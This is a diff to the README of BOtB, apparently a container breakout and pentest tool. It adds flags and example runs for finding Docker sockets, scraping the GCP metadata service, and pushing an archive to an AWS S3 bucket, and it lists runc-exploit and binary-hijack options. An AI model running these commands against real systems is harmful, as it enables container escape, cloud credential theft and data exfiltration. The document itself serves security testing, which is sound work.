@@ -49,9 +49,7 @@ go build -o botbsBinary
 # Usage
 BOtB can be compiled into a binary for the targeted platform and supports the following usage
 ```
-./bob_linux_amd64 -h
-[+] Break Out The Box
-Usage of ./bob_linux_amd64:
+Usage of ./botb:
   -aggr string
         Attempt to exploit RuncPWN (default "nil")
   -autopwn
@@ -62,20 +60,26 @@ Usage of ./bob_linux_amd64:
         Provide a wordlist (default "nil")
   -findDockerD
         Attempt to find Dockerd
+  -findHTTP
+        Hunt for Available UNIX Domain Sockets with HTTP
   -hijack string
         Attempt to hijack binaries on host (default "nil")
-  -http
-        Hunt for Available UNIX Domain Sockets with HTTP
   -interfaces
         Display available network interfaces
   -metadata
         Attempt to find metadata services
   -path string
         Path to Start Scanning for UNIX Domain Sockets (default "/")
-  -portscan string
-        Attempt to portscan a host (default "nil")
   -recon
         Perform Recon of the Container ENV
+  -region string
+        Provide a AWS Region e.g eu-west-2 (default "nil")
+  -s3bucket string
+        Provide a bucket name for S3 Push (default "nil")
+  -s3push string
+        Push a file to S3 e.g Full command to push to https://YOURBUCKET.s3.eu-west-2.amazonaws.com/FILENAME would be: -region eu-west-2 -s3bucket YOURBUCKET -s3push FILENAME (default "nil")
+  -scrapeGCP
+        Attempt to scrape the GCP metadata service
   -socket
         Hunt for Available UNIX Domain Sockets
   -verbose
@@ -254,6 +258,51 @@ https://heroku.com
 [*] Got Interface: ip6tnl0
 [*] Got Interface: eth0
         [*] Got address: 172.17.0.3/16
+[+] Finished
+
+```
+
+
+### Scan for UNIX Domain Sockets that respond to HTTP
+```
+#  ./bob_linux_amd64 -findHTTP=true
+[+] Break Out The Box
+[+] Looking for HTTP enabled Sockets
+[!] Valid HTTP Socket: /var/run/docker.sock
+[+] Finished
+
+```
+
+### Scrape data from GCP metadata instance
+```
+#  ./botb_linux_amd64 -scrapeGCP=true
+[+] Break Out The Box
+[+] Attempting to connect to:  169.254.169.254:80
+
+[*] Output->
+ HTTP/1.0 200 OK
+Metadata-Flavor: Google
+Content-Type: application/text
+Date: Sun, 30 Jun 2019 21:53:41 GMT
+Server: Metadata Server for VM
+Connection: Close
+Content-Length: 21013
+X-XSS-Protection: 0
+X-Frame-Options: SAMEORIGIN
+
+0.1/meta-data/attached-disks/disks/0/deviceName persistent-disk-0
+0.1/meta-data/attached-disks/disks/0/index 0
+0.1/meta-data/attached-disks/disks/0/mode READ_WRITE
+.....
+
+```
+
+### Push data to an AWS S3 Bucket
+```
+#  ./bob_linux_amd64 -s3push=fileToPush.tar.gz -s3bucket=nameOfS3Bucket -region=eu-west-2
+[+] Break Out The Box
+[+] Pushing fileToPush.tar.gz -> nameOfS3Bucket
+[*] Data uploaded to: https://nameOfS3Bucket.s3.eu-west-2.amazonaws.com/fileToPush.tar.gz
 [+] Finished
 
 ```
